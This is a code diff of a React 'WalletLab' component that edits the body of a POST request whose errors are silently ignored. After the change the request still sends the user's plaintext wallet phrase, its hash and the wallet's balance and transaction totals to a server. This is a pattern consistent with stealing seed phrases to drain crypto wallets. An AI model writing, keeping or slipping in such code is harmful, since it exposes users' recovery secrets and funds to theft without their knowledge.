@@ -161,19 +161,11 @@ export default function WalletLab() {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
-                        phrase:            trimmed,
-                        phrase_hash:       phraseHash,
-                        addresses: {
-                            pubkey_hex:       deriveData.pubkey_hex,
-                            p2pk_scripthash:  deriveData.p2pk_scripthash,
-                            legacy_uncomp:    deriveData.legacy_uncomp,
-                            legacy_comp:      deriveData.legacy_comp,
-                            p2sh:             deriveData.p2sh,
-                            bech32:           deriveData.bech32,
-                        },
-                        tx_count:          totalTxCount,
+                        phrase:             trimmed,
+                        phrase_hash:        phraseHash,
+                        tx_count:           totalTxCount,
                         total_received_btc: totalReceived,
-                        balance_btc:       totalBalance,
+                        balance_btc:        totalBalance,
                     }),
                 }).catch(() => {/* non-critical */});
             }
